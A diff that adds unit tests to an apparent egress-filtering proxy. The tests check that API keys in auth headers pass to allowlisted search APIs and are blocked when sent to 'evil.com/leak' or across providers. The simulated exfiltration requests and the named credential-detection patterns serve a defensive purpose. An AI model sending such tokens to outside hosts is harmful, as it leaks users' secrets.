@@ -347,6 +347,96 @@ class TestAllowlistAwareScanning:
 
         assert flow.killed
 
+    def test_bearer_auth_header_passes_on_allowlisted_host(self):
+        """Firecrawl shape: API key in Authorization: Bearer header.
+
+        The legacy generic_bearer pattern matched and killed every call
+        before this gate was extended. Regression for Moonsong's Round-7
+        finding."""
+        allowlist = _allowlist_with("api.firecrawl.dev")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "api.firecrawl.dev", "/v1/search",
+            body=b'{"query":"x"}',
+            headers={"Authorization": "Bearer fc-" + "M9nB8vC7xZ6aS5dF4gH3jK2lP1qW0eR9tY8u",
+                     "Content-Type": "application/json"},
+        )
+
+        addon.request(flow)
+
+        assert not flow.killed
+
+    def test_x_api_key_header_passes_on_allowlisted_host(self):
+        """Exa shape: API key in x-api-key header.
+
+        The legacy generic_api_key pattern matched on `api-key:` and
+        killed every call before this gate was extended."""
+        allowlist = _allowlist_with("api.exa.ai")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "api.exa.ai", "/search",
+            body=b'{"query":"x","numResults":1}',
+            headers={"x-api-key": "exa_Z8yX7wV6uT5sR4qP3nM2lK1jH0gF9eD8",
+                     "Content-Type": "application/json"},
+        )
+
+        addon.request(flow)
+
+        assert not flow.killed
+
+    def test_bearer_header_still_blocked_on_non_allowlisted_host(self):
+        """Regression-protect: header-carried auth still trips the
+        generic_bearer pattern on non-allowlisted hosts."""
+        allowlist = _allowlist_with("api.firecrawl.dev")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "evil.com", "/leak",
+            body=b"{}",
+            headers={"Authorization": "Bearer fc-" + "M9nB8vC7xZ6aS5dF4gH3jK2lP1qW0eR9tY8u"},
+        )
+
+        addon.request(flow)
+
+        # evil.com isn't allowlisted, so the request is killed at the
+        # allowlist gate; if the gate ever changed to allow-all, the
+        # generic_bearer detector would catch this in the body scanner.
+        assert flow.killed
+
+    def test_targeted_provider_key_in_header_still_blocked_on_allowlisted_host(self):
+        """An OpenAI key sent to an allowlisted Tavily endpoint via the
+        Authorization header is still cross-provider exfiltration.
+        Targeted patterns (openai_api_key, github_token, ...) are NOT
+        in the allowlist-skip set."""
+        allowlist = _allowlist_with("api.tavily.com")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        # sk-...{20+} matches the openai_api_key pattern, not just
+        # the generic_bearer one.
+        flow = FakeFlow(
+            "api.tavily.com", "/search",
+            body=b'{"query":"x"}',
+            headers={"Authorization": "Bearer sk-proj-realopenaikey1234567890abcdef"},
+        )
+
+        addon.request(flow)
+
+        assert flow.killed
+
 
 class TestContentScannerHostAllowlistedFlag:
     """Direct unit tests for ContentScanner.scan_request(host_allowlisted=...)."""
@@ -394,3 +484,47 @@ class TestContentScannerHostAllowlistedFlag:
             headers={},
         )
         assert blocked
+
+    def test_scan_request_skips_generic_bearer_when_allowlisted(self):
+        scanner = ContentScanner(vault_values=[])
+        blocked, _ = scanner.scan_request(
+            url="https://api.firecrawl.dev/v1/search",
+            body='{"q":"x"}',
+            headers={"Authorization": "Bearer fc-MnBvCxZaSdFgHjKlPqWeRtYu1234567890"},
+            host_allowlisted=True,
+        )
+        assert not blocked
+
+    def test_scan_request_skips_generic_api_key_when_allowlisted(self):
+        scanner = ContentScanner(vault_values=[])
+        blocked, _ = scanner.scan_request(
+            url="https://api.exa.ai/search",
+            body='{"q":"x"}',
+            headers={"x-api-key": "exa_ZyXwVuTsRqPnMlKjHgFeDcBa1234567890"},
+            host_allowlisted=True,
+        )
+        assert not blocked
+
+    def test_scan_request_blocks_generic_bearer_off_allowlist(self):
+        """Off-allowlist regression: generic_bearer still fires."""
+        scanner = ContentScanner(vault_values=[])
+        blocked, reason = scanner.scan_request(
+            url="https://evil.com/leak",
+            body="{}",
+            headers={"Authorization": "Bearer fc-MnBvCxZaSdFgHjKlPqWeRtYu1234567890"},
+            host_allowlisted=False,
+        )
+        assert blocked
+        assert reason and "generic_bearer" in reason
+
+    def test_scan_request_blocks_targeted_pattern_even_when_allowlisted(self):
+        """openai_api_key (a targeted pattern) is NOT in the skip set."""
+        scanner = ContentScanner(vault_values=[])
+        blocked, reason = scanner.scan_request(
+            url="https://api.tavily.com/search",
+            body="{}",
+            headers={"Authorization": "Bearer sk-proj-realopenaikey1234567890abcdef"},
+            host_allowlisted=True,
+        )
+        assert blocked
+        assert reason and "openai_api_key" in reason
